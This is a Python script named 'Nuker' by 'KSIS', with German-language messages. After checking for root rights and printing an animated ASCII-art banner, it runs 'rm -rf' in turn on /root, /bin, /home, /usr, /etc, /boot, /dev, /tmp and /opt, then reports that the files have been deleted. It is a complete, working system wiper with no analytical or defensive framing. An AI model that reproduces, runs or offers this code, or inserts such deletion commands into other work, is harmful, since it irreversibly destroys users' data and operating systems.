import os
from time import sleep
import sys
import colorama
from colorama import Fore, Style

if os.getuid() == 0:
	try:
    		os.system('clear')
	except:
		os.system('cls')
else:
    nb1 = Fore.BLUE+"Du brauchst root Rechte!"
    for x in nb1:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.01)
    exit(0)
    
nb1 = Fore.BLUE+" _   _       _             \n"

for x in nb1:
    print(x, end='')
    sys.stdout.flush()
    sleep(0.01)
    
nb2 = "| \ | |     | |            \n"

for x in nb2:
    print(x, end='')
    sys.stdout.flush()
    sleep(0.01)

    
nb3 = "|  \| |_   _| | _____ _ __ \n"

for x in nb3:
    print(x, end='')
    sys.stdout.flush()
    sleep(0.01)
   
nb4 = "| . ` | | | | |/ / _ \ '__|\n"

for x in nb4:
    print(x, end='')
    sys.stdout.flush()
    sleep(0.01)

nb5 = "| |\  | |_| |   <  __/ |   \n"

for x in nb5:
    print(x, end='')
    sys.stdout.flush()
    sleep(0.01)   

nb6 = "|_| \_|\__,_|_|\_\___|_|   \n"

for x in nb6:
    print(x, end='')
    sys.stdout.flush()
    sleep(0.01)   
print('    by KSIS\n\n\n')

try:

    del1 = "[+] deleting /root\n"
    for x in del1:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)
    os.system('rm -rf /root')

except:
    del1 = "\n[!] Error\n"
    for x in del1:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)

try:

    del2 = "[+] deleting /bin\n"
    for x in del2:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)
    os.system('rm -rf /bin')

except:
    del1 = "\n[!] Error\n"
    for x in del1:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)

try:

    del3 = "[+] deleting /home\n"
    for x in del3:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)
    os.system('rm -rf /home')
except:
    del1 = "\n[!] Error\n"
    for x in del1:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)

try:

    del4 = "[+] deleting /usr\n"
    for x in del4:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)
    os.system('rm -rf /usr')
except:
    del1 = "\n[!] Error\n"
    for x in del1:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)
try:
       
    del5 = "[+] deleting /etc\n"
    for x in del5:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)
    os.system('rm -rf /etc')
except:
    del1 = "\n[!] Error\n"
    for x in del1:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)

try:

    del6 = "[+] deleting /boot\n"

    for x in del6:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)
    os.system('rm -rf /boot')

except:
    del1 = "\n[!] Error\n"
    for x in del1:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)

try:
        
    del7 = "[+] deleting /dev\n"

    for x in del7:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)
    os.system('rm -rf /dev')

except:
    del1 = "\n[!] Error\n"
    for x in del1:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)

try:
        
    del8 = "[+] deleting /tmp\n"

    for x in del8:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)
    os.system('rm -rf /tmp')
    
except:
    del1 = "\n[!] Error\n"
    for x in del1:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)

try:
        
    del9 = "[+] deleting /opt\n"

    for x in del9:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)
    os.system('rm -rf /opt')
except:
    del1 = "\n[!] Error\n"
    for x in del1:
        print(x, end='')
        sys.stdout.flush()
        sleep(0.05)


al = "\n[+] Files wurden gelöscht!"

for x in al:
    print(x, end='')
    sys.stdout.flush()
    sleep(0.05)
